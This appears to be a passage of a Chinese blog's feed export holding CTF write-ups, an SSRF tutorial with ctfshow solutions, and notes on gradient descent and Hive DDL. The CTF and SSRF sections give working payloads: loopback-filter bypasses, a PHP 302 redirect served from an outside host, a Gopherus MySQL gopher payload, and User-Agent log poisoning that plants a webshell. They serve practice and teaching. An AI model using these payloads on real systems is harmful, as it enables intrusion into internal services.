title="buuctf神奇的二维码"></a>buuctf神奇的二维码</h1><ol><li>一个二维码，扫一下啥也没有</li><li>在放到010editor看头和尾和检查是否为exif隐写之后，binwalk分离出来了压缩包<br> <img src="https://s2.loli.net/2022/05/21/hle1bIpEKm9PzB7.png"></li><li>里面有一个encode.txt编码文件<br> <img src="https://s2.loli.net/2022/05/21/VFnBgsLtlZW52J4.png"></li><li>解码之后获得密码，打开了放flag的doc文件<br> <img src="https://s2.loli.net/2022/05/21/jz1mJAOsChTuYeL.png"></li><li>发现flag.doc文件中是一个特别长的base64编码，使用basecrack破解<br> <img src="https://s2.loli.net/2022/05/21/kmaJoR5WdUAHglS.png"></li><li>获得flag<br> <a href="www.strongwill.top/basecrack工具使用">basecrack工具使用</a></li></ol><h1 id="buu-test-your-nc"><a href="#buu-test-your-nc" class="headerlink" title="buu test_your_nc"></a>buu test_your_nc</h1><p><a href="www.strongwill.top/nc命令">nc命令</a><br><img src="https://s2.loli.net/2022/05/21/8Jj69Obg3DzKQBn.png"></p><ol><li>直接nc加靶机号，连上之后ls看目录</li><li>发现flag，直接cat看一下就报flag</li></ol><h1 id="pwnthebox-pwnthebox"><a href="#pwnthebox-pwnthebox" class="headerlink" title="pwnthebox pwnthebox"></a>pwnthebox pwnthebox</h1><ol><li>信息搜集题目<br> <img src="https://s2.loli.net/2022/05/23/vQ89c6gZWDVSndX.png"></li><li>在header中,抓个包<br> <img src="https://s2.loli.net/2022/05/21/qB9zAWvCNQTr6UV.png"></li><li>在header中找到了flag</li></ol><h1 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h1><ol><li>  python的shell终端</li><li>  拼接读取flag的字符串后用eval()进行执行，即可获得flag</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png"></li></ol><h1 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h1><ol><li><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png"></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png"></p></li><li><p>  过滤了post和get，不能直接将木马写入参数中执行</p></li><li><p>  这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png"></p></li><li><p>  访问/log/a.php发现可以成功执行</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150427.png"></p></li><li><p>  最后在env环境变量中找到flag</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png"></p></li></ol><h1 id="Head-Header"><a href="#Head-Header" class="headerlink" title="Head,Header?"></a>Head,Header?</h1><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220927190910.png"></li><li>  需要CTF浏览器，想到更改UA，UA是服务器识别客户端的操作系统、浏览器等信息的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220927191126.png"></li><li>  有回显，from ctf.com,加referer外链，告诉服务器该页面是从哪个页面链接过来的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220927191405.png"></li><li>  又提示只能local用户查看，修改X-Forwarded-For为127.0.0.1回环地址</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220927191509.png"></li></ol><h1 id="图片合成问题"><a href="#图片合成问题" class="headerlink" title="图片合成问题"></a>图片合成问题</h1><h2 id="攻防世界what-is-this"><a href="#攻防世界what-is-this" class="headerlink" title="攻防世界what_is_this"></a>攻防世界what_is_this</h2><ol><li>给出两张相像的图片</li><li>使用stegsolve中的image combiner</li><li><a href="https://imgtu.com/i/qOwZaF"><img src="https://s1.ax1x.com/2022/04/05/qOwZaF.png" alt="qOwZaF.png"></a></li><li><a href="https://imgtu.com/i/qOwe54"><img src="https://s1.ax1x.com/2022/04/05/qOwe54.png" alt="qOwe54.png"></a></li><li>其实也可以使用comapre去比较</li><li>compare pic1.jpg pic2.jpg -compose src diff.png</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf漏洞</title>
      <link href="/ssrf%E6%BC%8F%E6%B4%9E/"/>
      <url>/ssrf%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ssrf漏洞"><a href="#ssrf漏洞" class="headerlink" title="ssrf漏洞"></a>ssrf漏洞</h1><h2 id="自己总结的绕过方法"><a href="#自己总结的绕过方法" class="headerlink" title="自己总结的绕过方法"></a>自己总结的绕过方法</h2><ol><li>  进制绕过，127进行<strong>16进制编码</strong>等</li><li>  用特殊短地址进行绕过<strong>127.1</strong>或<strong>0.0.0.0</strong>或<strong>0.0</strong>或<strong>0</strong>可以代替127.0.0.1</li><li>  正则表达式检验开头结尾的，<strong>用@进行分隔</strong>username和hostname</li><li>  302跳转，在自己的服务器上写php Location代码</li></ol><h2 id="ssrf漏洞是什么"><a href="#ssrf漏洞是什么" class="headerlink" title="ssrf漏洞是什么"></a>ssrf漏洞是什么</h2><ol><li><p>  SSRF漏洞（Server-Side Request Forgery）是一种Web应用程序漏洞，它允许攻击者在受攻击的服务器上执行未经授权的网络请求。具体而言，攻击者可以构造一个特制的请求，在请求中指定一个外部的URL地址，然后将该请求发送给目标服务器。目标服务器接收到请求后，会认为这个请求来自于内部网络的可信源，并向指定的URL地址发起请求。由于攻击者可以任意指定这个URL地址，因此可以利用该漏洞实现多种攻击，如获取敏感信息、执行任意命令等。</p></li><li><p>  SSRF漏洞通常出现在Web应用程序中，例如一个Web应用程序提供了针对用户输入URL的功能，但没有对用户输入的URL做足够的安全检查，导致攻击者可以通过构造恶意URL利用该漏洞。此外，攻击者也可以通过其他途径（如文件上传功能）来利用该漏洞。</p></li><li><p>  为了防止SSRF漏洞的出现，开发人员需要对Web应用程序中的所有外部请求进行仔细的检查和过滤</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230420143621.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li>  攻击者可以通过公网IP访问到某个web服务器</li><li>  攻击者无法通过公网IP访问到内网的其他设备或者办公区域</li><li>  这时候如果想要进行内网探测，web服务器同时存在ssrf漏洞，就能够以web服务器作为跳板，进而攻击其它服务器或者区域</li></ol><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>  （1）web服务器存在SSRF漏洞；</p><p>  （2）web服务器有访问本地或远程服务器的权限；</p><h3 id="存在位置"><a href="#存在位置" class="headerlink" title="存在位置"></a>存在位置</h3><p>  一般是web服务器提供了从其他服务器获取数据的功能。</p><p>  （1）通过URL分享网页内容</p><p>  （2）在线翻译</p><p>  （3）通过url对图片的加载和下载</p><p>  （4）转码服务</p><h3 id="利用实验，开启方法"><a href="#利用实验，开启方法" class="headerlink" title="利用实验，开启方法"></a>利用实验，开启方法</h3><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230420143924.png"></p></li></ol><h3 id="ctfshow351"><a href="#ctfshow351" class="headerlink" title="ctfshow351"></a>ctfshow351</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230420140824.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230420141556.png"></p><ol><li><p>  源码中接收了一个post传递的url参数，用hackbar去构造攻击payload</p></li><li><p>```php<br>  url=<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>  <pre class="line-numbers language-none"><code class="language-none">3.   即可出现flag### ctfshow352### parse_url函数的作用&#96;parse_url()&#96; 是 PHP 语言中的一个函数，它用于解析 URL 地址并以关联数组的形式返回各个组成部分。在解析过程中，会将 URL 字符串拆分成协议名、主机名、端口号、路径、查询字符串和片段标识等多个组成部分，并分别保存到返回的关联数组中。这个函数不会对 URL 解码，所以可以被用来解析包含特殊字符的 URL。具体而言，&#96;parse_url()&#96; 函数的格式为：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpCopy Codearray parse_url ( string $url [, int $component = -1 ] )</p><pre class="line-numbers language-none"><code class="language-none">其中，&#96;$url&#96; 参数是要解析的 URL 地址字符串，&#96;$component&#96; 参数可选，表示要返回的 URL 组件，取值范围为 &#96;PHP_URL_SCHEME&#96;、&#96;PHP_URL_HOST&#96;、&#96;PHP_URL_PORT&#96;、&#96;PHP_URL_USER&#96;、&#96;PHP_URL_PASS&#96;、&#96;PHP_URL_PATH&#96;、&#96;PHP_URL_QUERY&#96; 或 &#96;PHP_URL_FRAGMENT&#96;。如果不指定 &#96;$component&#96; 参数，则函数将返回包含所有 URL 组件的关联数组。例子：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>phpCopy Code$url = “<a href="https://www.example.com/test.php?id=123#section4&quot;">https://www.example.com/test.php?id=123#section4&quot;</a>;<br>$parsed_url = parse_url($url);</p></li></ol><p>print_r($parsed_url);</p><pre class="line-numbers language-none"><code class="language-none">输出结果为:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Copy CodeArray<br>(<br>    [scheme] =&gt; https<br>    [host] =&gt; <a href="http://www.example.com/">www.example.com</a><br>    [path] =&gt; /test.php<br>    [query] =&gt; id=123<br>    [fragment] =&gt; section4<br>)</p><pre class="line-numbers language-none"><code class="language-none">### schemescheme：协议### curlCurl（全称为 &quot;Client Url Library&quot;）是一个被广泛应用于互联网通信的工具和库，它支持各种传输协议，比如FTP、HTTP、SMTP等。在PHP中，curl以扩展库的形式提供，开发者可以借助curl扩展实现各种基于网络协议的操作，例如下载文件、发送HTTP请求、获取API数据等等。常见的curl函数有:-   &#96;curl_init()&#96; - 初始化一个 curl 会话-   &#96;curl_setopt()&#96; - 设置 curl 相关选项-   &#96;curl_exec()&#96; - 执行 curl 会话-   &#96;curl_close()&#96; - 关闭curl 会话&#96;curl_setopt()&#96; 函数可以设置不同的选项来定制 curl 的行为。例如：-   &#96;CURLOPT_URL&#96; 设置URL地址-   &#96;CURLOPT_RETURNTRANSFER&#96; 返回结果而不是输出到页面-   &#96;CURLOPT_POST&#96; 使用POST请求方式-   &#96;CURLOPT_POSTFIELDS&#96; POST请求提交的数据-   &#96;CURLOPT_HEADER&#96; 包含响应头信息-   &#96;CURLOPT_SSL_VERIFYPEER&#96; 是否验证证书等等以上只是 curl 的一些基本使用方法，通过查阅Curl文档[[1](https:&#x2F;&#x2F;curl.se&#x2F;docs&#x2F;manpage.html)]，你还可以了解到使用curl库还能够支持更多的功能比如: 代理、cookie设置、安全认证、文件上传等。在 PHP 中，我们可以通过 curl 扩展的一系列函数来实现 curl 功能，并且这些函数具备很高的灵活性和可扩展性，可以根据不同的需求和场景完成各种网络请求操作。#### 题目1.   将127.0.1替换为127.0.0，127.1等都可以2.   之前写过一个golang后端的项目，用的0.0.0.0，既包含了localhost,也包含了127.0.0.1，这里可以绕过字符过滤3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20230420142950.png)### web3531.   可以将127进行16进制编码，编码为0x7f2.   也可以转换为其它进制3.   127.0.0.1可以写为127.1也可以绕过4.   &#96;&#96;&#96;     url&#x3D;http:&#x2F;&#x2F;0x7f.0.0.1&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230420144929.png"></li></ol><h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230422153422.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230422153448.png"></li><li>  用127.1和0.0相同，都可以代替回环地址127.0.0.1</li></ol><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230422153824.png"></li><li>  用0也可以代替127.0.0.1或0.0</li></ol><h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><ol><li><p>  这段代码使用PHP内置函数<code>filter_var()</code>对<code>$ip</code>变量进行IP地址过滤和验证，其中<code>FILTER_VALIDATE_IP</code>用于验证是否为合法的IP地址，<code>FILTER_FLAG_NO_PRIV_RANGE</code>表示拒绝私有IP地址，<code>FILTER_FLAG_NO_RES_RANGE</code>表示拒绝保留IP地址。具体来说，这段代码会返回<code>$ip</code>变量的过滤后结果，如果$ip不是合法的公网IP地址，则返回false。</p></li><li><p>  这个题利用302跳转</p></li><li><p>  在服务器上放以下代码</p></li><li><p>```php</p>  <?php  header("Location:http://127.0.0.1/flag.php")  <pre class="line-numbers language-none"><code class="language-none">5.   攻击payload6.   &#96;&#96;&#96;     url&#x3D;http:&#x2F;&#x2F;www.ctfer.xyz&#x2F;a.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  使用此url参数进行传参，可以通过访问<a href="http://www.ctfer.xyz下的a.php来跳转访问到内网127.0.0.1下的flag.php文件/">www.ctfer.xyz下的a.php来跳转访问到内网127.0.0.1下的flag.php文件</a></p></li></ol><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230427154130.png"></p></li><li><p>```<br>  /^http://ctf..*show$/i</p>  <pre class="line-numbers language-none"><code class="language-none">3.   匹配的是以http:&#x2F;&#x2F;ctf.开头，以show结尾的4.   &#96;&#96;&#96;url     http:&#x2F;&#x2F;ctf.@127.0.0.1&#x2F;flag.php?show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  使用@作为分隔符，用于指示用户名和域名之间的分界。用于url的基本身份验证，指定用户名和密码来访问资源，例如：<a href="http://username:password@example.com/">http://username:password@example.com</a></p></li><li><p>  类似于ssh登录目标主机一样</p></li><li><p>```<br>  ssh [options] [username@]hostname command<br>  ssh -p 22 <a href="mailto:&#x75;&#115;&#x65;&#114;&#x6e;&#x61;&#109;&#x65;&#64;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#46;&#x31;&#46;&#x31;&#x30;&#x30;">&#x75;&#115;&#x65;&#114;&#x6e;&#x61;&#109;&#x65;&#64;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#46;&#x31;&#46;&#x31;&#x30;&#x30;</a> # 使用22端口连接到主机192.168.1.100<br>  ssh -i ~/.ssh/id_rsa <a href="mailto:&#x75;&#115;&#101;&#114;&#64;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;">&#x75;&#115;&#101;&#114;&#64;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;</a><br>  ssh <a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#x65;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x63;&#111;&#109;">&#x75;&#x73;&#x65;&#x72;&#x40;&#x65;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x63;&#111;&#109;</a> ls -al /home/user # 登录并执行远程命令</p>  <pre class="line-numbers language-none"><code class="language-none">8.   使用@来分隔username和hostname### web3591.   工具下载地址https:&#x2F;&#x2F;github.com&#x2F;tarunkant&#x2F;Gopherus2.   &#96;&#96;&#96;     python gopherus.py --exploit mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230427161356.png"></p></li><li><p>  然后传到check.php中post:returl=xxx，不要忘记把下划线后面的内容url编码一次</p></li><li><p>  涉及到一些文件上传的知识，最后要用蚁剑去连接</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习</title>
      <link href="/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><h2 id="机器学习就是自动找函数式"><a href="#机器学习就是自动找函数式" class="headerlink" title="机器学习就是自动找函数式"></a>机器学习就是自动找函数式</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305145445.png"></li><li>  要问自己想要找什么样的函数，先去创建一个任务，regression和classification</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305145832.png"></li><li>  不能只会做判断输出1、2，后面发展到需要generate生成有结构的东西</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305150144.png"></li><li>  怎么告诉机器想要找什么样子的函数：supervised learning,而这需要labeled data，即标注数据集，即告诉机器想要得到的结果是什么样子</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305150326.png"></li><li>  评估一个函数的好坏：函数的LOSS</li><li>  下一步，期待机器会自动找出LOSS最低的函数</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305151035.png"></li><li>  机器如何找到你想要的函数：Linear-&gt;Network Architecture：给机器一个函数寻找的范围</li></ol><h2 id="Supervised-learning-vs-Reinforcement-learning"><a href="#Supervised-learning-vs-Reinforcement-learning" class="headerlink" title="Supervised learning vs Reinforcement learning"></a>Supervised learning vs Reinforcement learning</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305151333.png"></li><li>  Supervised learning:监督学习，给数据需要标注</li><li>  Reinforcement learning:强化学习，给的数据不需要标注</li></ol><h2 id="Meta-Learning-learn-to-learn-让机器学会学习"><a href="#Meta-Learning-learn-to-learn-让机器学会学习" class="headerlink" title="Meta Learning = learn to learn 让机器学会学习"></a>Meta Learning = learn to learn 让机器学会学习</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305193015.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305193140.png"></li></ol><h2 id="life-long-learning"><a href="#life-long-learning" class="headerlink" title="life-long-learning"></a>life-long-learning</h2><ol><li>  终身学习</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305193326.png"></li></ol><h2 id="Regression"><a href="#Regression" class="headerlink" title="Regression"></a>Regression</h2><ol><li><p>  找函数</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305194042.png"></p><h3 id="三步走"><a href="#三步走" class="headerlink" title="三步走"></a>三步走</h3><ol><li>第一步，找一个model</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305194831.png"></li><li>第二步，定义function set，在function set中找到一个LOSS值最低的function</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305195047.png"></li><li>goodness of function,判断此函数的LOSS值，如何判断：找一个关于此函数的函数，能判断此函数的LOSS值的函数，输入值为a function,输出值为how bad it is,能判断此函数的好坏的值</li><li>假设函数是：</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305195659.png"></li><li>对此函数的结果求方差（其中^y是求得的估计值，减去的是每一只宝可梦的实际值带入得到的值）</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230305195718.png"></li><li>第三步，找到最好的function</li><li>找一个function，使得找到的L(f)最小，f* = argL(f)</li><li>或者找到一个w*,b*，使得argmin L(w,b)最小</li><li>第四步，Gradient Descent，目的是找到可以<strong>使LOSS值最小</strong>的w<h3 id="Gradient-Descent"><a href="#Gradient-Descent" class="headerlink" title="Gradient Descent"></a>Gradient Descent</h3><ol><li><p>暴力的做法是穷举所有的w,找到LOSS值最小的w</p></li><li><p>  可以：随机选取初始的w0；构建横轴为w，纵轴为L的坐标系，在初始的w位置L对w的导数（切线斜率），如果切线斜率为负数，则随着w的增大，LOSS值减小，所以要增加w的值；如果斜率为正，则要减小w的值$\frac{dL}{dw}|w=w0$</p></li><li><p>  增加/减小w的值应该有多大：1. 取决于dL/dw的值（切线斜率、导数）有多大，如果越大，越陡峭，移动距离就越大 2.取决于learning rate的值的大小（事先定好的一个常数），如果learning rate的值较大，踏出一步的时候，参数更新的幅度就比较大，则学习的效率、速度就比较快 </p></li><li><p>  $w1 = w0 - \eta*\frac{dL}{dw}|w=w0$</p></li><li><p>  $w2 = w0 - \eta*\frac{dL}{dw}|w=w0$</p></li><li><p>  经过多次iteration（迭代）之后就到达了local optimal(局部最优解)，此时在local optimal的点，算出的微分都是0了，不会再进行更新</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230311225527.png"></p></li><li><p>  当是两个参数时，$w*,b* = arg minL(w,b)$</p></li><li><p>  思路相同，先选取两个初始值，w0和b0</p></li><li><p>  然后在初始值位置求偏导$\frac{\partial L}{\partial w}|w=w0,b=b0$,$\frac{\partial L}{\partial b}|w=w0,b=b0$</p></li><li><p>  更新，$w1 = w0 - \eta*\frac{\partial L}{\partial w}|w=w0,b=b0$,$b1 = b0 - \eta\frac{\partial L}{\partial b}|w=w0,b=b0$</p></li><li><p>  进行多次iteration(迭代),就可以到达local optimal</p></li><li><p>  因为Regression是线性的，所以单调，local optimal == global optimal</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230311230935.png"></p></li><li><p>  gradient指的是$\frac{\partial L}{\partial w}$,$\frac{\partial L}{\partial b}$所组成的一个vector(向量)，且gradient的符号是倒三角$\nabla$</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230311231305.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230311231542.png"></p></li><li><p>  二维可视化：$(-\eta<em>\frac{\partial L}{\partial b},-\eta</em>\frac{\partial L}{\partial w})$的方向是切线的法线方向，指向的是圆心</p></li><li><p>  local optimal == global optimal的问题：因为linear regression(线性回归)的loss值是convex（凸面）的，所以没有local optimal(局部最优解)</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230311232505.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230311232719.png"></p></li><li><p>  求复合函数的偏导：外面导里面不导 * 里面导</p></li></ol></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hive数据定义语言DDL</title>
      <link href="/hive%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80DDL/"/>
      <url>/hive%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80DDL/</url>
      
        <content type="html"><![CDATA[<h1 id="hive数-据定义语言DDL"><a href="#hive数-据定义语言DDL" class="headerlink" title="hive数 据定义语言DDL"></a>hive数 据定义语言DDL</h1><h2 id="数据定义语言概述"><a href="#数据定义语言概述" class="headerlink" title="数据定义语言概述"></a>数据定义语言概述</h2><ol><li>  数据定义语言 (Data Definition Language, DDL)，是SQL语言集中对数据库内部的对象结构进行创建，删除，修改等的操作语言，这些数据库对象包括database（schema）、table、view、index等。</li><li>  DDL核心语法由CREATE、ALTER与DROP三个所组成。DDL是对表结构进行的操作。</li><li>  在某些上下文中，该术语也称为数据描述语言，因为它描述了数据库表中的字段和记录。</li></ol><h2 id="Hive-DDL操作"><a href="#Hive-DDL操作" class="headerlink" title="Hive DDL操作"></a>Hive DDL操作</h2><h3 id="DDL基本概念"><a href="#DDL基本概念" class="headerlink" title="DDL基本概念"></a>DDL基本概念</h3><ol><li>  在Hive中，DATABASE的概念和RDBMS中类似，我们称之为数据库，DATABASE和SCHEMA是可互换的，都可以使用。</li><li>  hive的数据库本质上就是一个目录</li><li>  默认的数据库叫做default,存储于/user/hive/warehouse下</li><li>  用户自己创建的数据库存储位置是/user/hive/warehouse/数据库名.db下</li></ol><h3 id="数据库的基本命令"><a href="#数据库的基本命令" class="headerlink" title="数据库的基本命令"></a>数据库的基本命令</h3><ol><li><p>show databases 查看系统中所有的数据库</p>  <pre class="line-numbers language-none"><code class="language-none">show databases;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114193204.png"></p></li><li><p>create table 创建数据库</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">create (DATABASE|SCHEMA) [IF NOT EXISTS] database_name[COMMENT database_comment] -- COMMENT用来添加数据库的注释说明语句[LOCATION hdfs_path] -- LOCATION用来指定数据库在HDFS的存储位置，默认&#x2F;user&#x2F;hive&#x2F;warehouse&#x2F;dbname.db[WITH DBPROPERTIES (proterty_name &#x3D; property_value,...)];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  如果需要使用location指定路径的时候，最好指向的是一个新创建的空文件夹</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114194309.png"></p></li><li><p>  describe database 查看数据库结构</p></li><li><p>  显示hive中数据库的名称，注释（如果已经设置），及其在文件系统中的位置等信息</p></li><li><p>extended关键字用于显示更多的信息，可以将describe简写成desc来使用</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">describe database&#x2F;schema extended db_name;desc database [extend] db_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114200306.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114200312.png"></p></li><li><p>use database;选择当前的数据库</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">use database db_name;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  alter database 修改数据库的内容</p></li><li><p>更改与Hive中的数据库相关联的元数据</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">alter (database|schema) database_name set dbproperties (property_name&#x3D;property_value,...); -- 更改数据库的属性<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">alter (database|schema) database_name set OWNER USER user; -- 更改数据库的所有者<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">alter (database|schema) database_name set location hdfs_path; -- 更改数据库的位置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114201434.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114201439.png"></p></li><li><p>  drop database 删除数据库</p></li><li><p>  默认行为是RESTRICT,意味着仅在数据库为空时才删除它</p></li><li><p>要删除带有表的数据库（不为空的数据库），我们可以使用CASCADE</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">DROP (DATABASE|SCHEMA) [IF EXISTS] database_name [RESTRICT|CASCADE];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114204811.png"></p></li></ol><h3 id="Hive表的基本命令"><a href="#Hive表的基本命令" class="headerlink" title="Hive表的基本命令"></a>Hive表的基本命令</h3><ol><li><p>show tables;查看hive表的列表</p>   <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">show tables in 数据库名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114205024.png"></p></li><li><p>创建表的语法树</p>   <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">CREATE [TEMPORARY] [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name  [(col_name data_type [COMMENT col_comment], ... ]  [COMMENT table_comment]  [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)]  [CLUSTERED BY (col_name, col_name, ...) [SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS]  [ROW FORMAT DELIMITED|SERDE serde_name WITH SERDEPROPERTIES (property_name&#x3D;property_value,...)]  [STORED AS file_format]  [LOCATION hdfs_path]  [TBLPROPERTIES (property_name&#x3D;property_value, ...)];-- 建表语法中的语法顺序需要和语法树中的一致<span aria-hidden="true" 